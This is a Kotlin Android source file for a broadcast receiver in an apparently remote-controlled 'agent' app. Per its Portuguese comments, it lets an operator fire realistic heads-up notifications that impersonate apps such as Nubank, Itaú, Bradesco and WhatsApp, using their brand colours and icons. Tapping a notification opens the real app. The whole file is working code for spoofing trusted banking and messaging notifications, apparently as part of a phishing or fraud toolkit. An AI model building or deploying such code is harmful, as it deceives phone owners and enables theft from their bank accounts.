package com.droidview.agent.receiver

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.os.Build
import android.util.Log
import com.droidview.agent.MainActivity
import com.droidview.agent.R

/**
 * Receptor de Push Notifications Dinâmicas via Painel Web / ADB.
 * Permite ao operador selecionar qualquer aplicativo (Nubank, WhatsApp, Jadlog, Renner, etc.),
 * redigir título e mensagem, e disparar uma notificação push heads-up autêntica no aparelho Android.
 */
class PushNotificationReceiver : BroadcastReceiver() {

    companion object {
        const val TAG = "PushNotificationRcvr"
        const val ACTION_PUSH_NOTIFICATION = "com.droidview.agent.ACTION_PUSH_NOTIFICATION"
        const val CHANNEL_ID = "dview_push_heads_up_channel"

        private var notificationCounter = 10000
    }

    override fun onReceive(context: Context, intent: Intent?) {
        if (intent == null || intent.action != ACTION_PUSH_NOTIFICATION) return

        val appName = intent.getStringExtra("appName")?.trim() ?: "Mensagem"
        val packageName = intent.getStringExtra("packageName")?.trim() ?: "com.android.vending"
        val title = intent.getStringExtra("title")?.trim() ?: appName
        val message = intent.getStringExtra("message")?.trim() ?: intent.getStringExtra("text")?.trim() ?: ""

        Log.i(TAG, "Push Notification recebida: [$appName] $title -> $message")

        try {
            showHeadsUpNotification(context, appName, packageName, title, message)
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao exibir push notification: ${e.message}", e)
        }
    }

    private fun showHeadsUpNotification(
        context: Context,
        appName: String,
        packageName: String,
        title: String,
        message: String
    ) {
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return

        // Cria o canal com prioridade ALTA para exibir banner flutuante (heads-up)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Alertas e Notificações Push",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Notificações instantâneas de aplicativos do sistema"
                enableLights(true)
                lightColor = Color.CYAN
                enableVibration(true)
                setShowBadge(true)
            }
            notificationManager.createNotificationChannel(channel)
        }

        // Tentar abrir o app alvo ao tocar na notificação, ou fallback para MainActivity
        val launchIntent = context.packageManager.getLaunchIntentForPackage(packageName)
            ?: Intent(context, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
            }

        val pendingIntent = PendingIntent.getActivity(
            context,
            notificationCounter,
            launchIntent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
        )

        val builder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(context, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(context).setPriority(Notification.PRIORITY_MAX)
        }

        builder
            .setContentTitle(title)
            .setContentText(message)
            .setSubText(appName)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setAutoCancel(true)
            .setPriority(Notification.PRIORITY_MAX)
            .setDefaults(Notification.DEFAULT_ALL)
            .setVibrate(longArrayOf(0, 250, 100, 250))

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            builder.setCategory(Notification.CATEGORY_MESSAGE)
            builder.setVisibility(Notification.VISIBILITY_PUBLIC)
        }

        val emojiIcon = resolveEmojiForApp(appName, packageName)
        val largeIcon = generateCircularAppIcon(context, emojiIcon, appName)
        if (largeIcon != null) {
            builder.setLargeIcon(largeIcon)
        }

        val notifId = notificationCounter++
        notificationManager.notify(notifId, builder.build())
        Log.i(TAG, "Notificação push disparada com sucesso! ID: $notifId | App: $appName")

        // Exibe Toast nativo imediato para garantir apresentação visual na tela do aparelho
        try {
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                android.widget.Toast.makeText(
                    context.applicationContext,
                    "🔔 [$appName] $title\n$message",
                    android.widget.Toast.LENGTH_LONG
                ).show()
            }
        } catch (_: Exception) {}
    }

    private fun resolveEmojiForApp(appName: String, packageName: String): String {
        val lower = "$appName $packageName".lowercase()
        return when {
            lower.contains("nubank") || lower.contains("nu.") -> "🟣"
            lower.contains("whatsapp") || lower.contains("whats") -> "💬"
            lower.contains("renner") -> "🛍️"
            lower.contains("jadlog") || lower.contains("log") -> "📦"
            lower.contains("inter") -> "🏦"
            lower.contains("itau") || lower.contains("itaú") -> "🟧"
            lower.contains("bradesco") || lower.contains("santander") -> "🏦"
            lower.contains("mercado livre") || lower.contains("mercadolivre") -> "🛒"
            lower.contains("chrome") -> "🌐"
            lower.contains("play") || lower.contains("vending") -> "🛍️"
            lower.contains("config") || lower.contains("settings") -> "⚙️"
            else -> "📱"
        }
    }

    private fun generateCircularAppIcon(context: Context, emoji: String, appName: String): Bitmap? {
        return try {
            val density = context.resources.displayMetrics.density
            val size = (64 * density).toInt().coerceAtLeast(64)
            val bitmap = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)

            val lower = appName.lowercase()
            val bgColor = when {
                lower.contains("nubank") -> Color.parseColor("#820AD1")
                lower.contains("whatsapp") -> Color.parseColor("#22C55E")
                lower.contains("renner") -> Color.parseColor("#E11D48")
                lower.contains("jadlog") -> Color.parseColor("#DC2626")
                lower.contains("itau") -> Color.parseColor("#EA580C")
                lower.contains("inter") -> Color.parseColor("#F97316")
                lower.contains("chrome") -> Color.parseColor("#2563EB")
                else -> Color.parseColor("#1E293B")
            }

            val bgPaint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
                color = bgColor
                style = Paint.Style.FILL
            }
            val radius = size / 2f
            canvas.drawCircle(radius, radius, radius, bgPaint)

            val paint = Paint(Paint.ANTI_ALIAS_FLAG).apply {
                textSize = 32 * density
                textAlign = Paint.Align.CENTER
            }
            val fontMetrics = paint.fontMetrics
            val y = size / 2f - (fontMetrics.ascent + fontMetrics.descent) / 2f
            canvas.drawText(emoji, size / 2f, y, paint)
            bitmap
        } catch (_: Exception) {
            null
        }
    }
}
